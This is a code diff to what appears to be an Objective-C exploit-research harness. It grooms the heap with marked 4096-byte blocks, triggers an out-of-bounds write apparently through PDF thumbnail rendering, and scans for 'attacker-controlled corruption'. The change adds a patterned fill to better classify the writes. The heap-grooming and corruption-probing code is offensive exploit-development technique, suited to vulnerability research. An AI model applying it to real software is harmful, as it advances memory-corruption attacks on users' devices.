@@ -68,9 +68,34 @@ static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
 // with a marker, trigger, then scan for CHANGED words.  If the OOB write lands
 // inside one of our blocks, the marker changes — that is a proof of
 // attacker-controlled corruption, usable even when the process survives.
+// The expected u64 at a byte offset of a carpet block: every u16 carries a known
+// pattern (0x0100 + (index & 0xff)) except the marker pair at +2048/+2050 of a
+// detector.  A uniform 0xA5 fill could not tell "+=" from "store zero" (0xa5a5
+// + 0x5a5b wraps to 0x0000 either way); the pattern can: a +1-style bump shows
+// as pattern+delta, a zero store as 0x0000.
+static uint64_t CarpetWant(size_t byteOff, int id) {
+    uint16_t p[4];
+    for (int t = 0; t < 4; t++) {
+        size_t j = (byteOff / 2) + (size_t)t;
+        uint16_t v = (uint16_t)(0x0100 + (j & 0xFF));
+        if (id >= 0 && (j == 1024 || j == 1025)) v = (uint16_t)(0xC000 + id);
+        p[t] = v;
+    }
+    return (uint64_t)p[0] | ((uint64_t)p[1] << 16) | ((uint64_t)p[2] << 32) | ((uint64_t)p[3] << 48);
+}
+
+static void CarpetFill(void *p, size_t bytes, int id) {
+    uint16_t *m = (uint16_t *)p;
+    size_t n16 = bytes / 2;
+    for (size_t j = 0; j < n16; j++) {
+        uint16_t v = (uint16_t)(0x0100 + (j & 0xFF));
+        if (id >= 0 && (j == 1024 || j == 1025)) v = (uint16_t)(0xC000 + id);
+        m[j] = v;
+    }
+}
+
 static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) {
     (void)each;
-    const uint64_t FILL = 0xA5A5A5A5A5A5A5A5ULL;
     // The reference layout that actually hit (`oob: *** HIT obj[42]
     // 0xC02A->0xC02B`, tpOOBDetect/tpGroomHeap): `regions` detector blocks of
     // 4096 B, each carrying the 16-bit marker 0xC000+obj at +2048 and +2050,
@@ -93,19 +118,10 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
     int n = 0, obj = 0;
     for (int r = 0; r < regions; r++) {
         void *d = malloc(4096);
-        if (d) {
-            memset(d, 0xA5, 4096);
-            uint16_t *m = (uint16_t *)d;
-            m[1024] = (uint16_t)(0xC000 + obj);   // +2048
-            m[1025] = (uint16_t)(0xC000 + obj);   // +2050
-            ptrs[n] = d; szl[n] = 4096; ids[n] = obj; n++; obj++;
-        }
+        if (d) { CarpetFill(d, 4096, obj); ptrs[n] = d; szl[n] = 4096; ids[n] = obj; n++; obj++; }
         for (int gi = 0; gi < nGroom; gi++) {
             void *g = malloc(groomSz[gi]);
-            if (g) {
-                memset(g, 0xA5, groomSz[gi]);
-                ptrs[n] = g; szl[n] = groomSz[gi]; ids[n] = -1; n++;
-            }
+            if (g) { CarpetFill(g, groomSz[gi], -1); ptrs[n] = g; szl[n] = groomSz[gi]; ids[n] = -1; n++; }
         }
     }
     AvePost([NSString stringWithFormat:@"86950 carpet: %d detectors x 4096 B "
@@ -128,12 +144,7 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
         void *p = ptrs[i];
         size_t sz = szl[i];
         uint64_t *q = (uint64_t *)p;
-        uint64_t want0 = FILL;
-        if (ids[i] >= 0) {
-            // little-endian: the u64 at +2048 is (u16@+2048) | ((u16@+2050) << 16)
-            uint32_t mark = (uint32_t)(0xC000 + ids[i]);
-            want0 = ((uint64_t)mark << 16) | mark;   // the +2048/+2050 pair
-        }
+        // markers at +2048/+2050 are part of CarpetWant below
         // the marker lives at +2048 (two u16 at +2048/+2050), NOT at +0: the earlier
         // build compared want0 at offset 0, so every detector mismatched there
         // AND at +2048 and the run reported a false "HEAP CORRUPTION CONFIRMED".
@@ -145,7 +156,7 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
     // the shape of the hit (which u16 inside the word, and how many blocks) was
     // invisible.  Print got AND want verbatim, up to 24 lines, then the total.
     for (size_t off = 0; off + 8 <= sz; off += 8) {
-            uint64_t want = ((ids[i] >= 0) && off == 2048) ? want0 : FILL;
+            uint64_t want = CarpetWant(off, ids[i]);
             if (q[off / 8] != want) {
                 corrupt++;
                 if (printed < 24) {
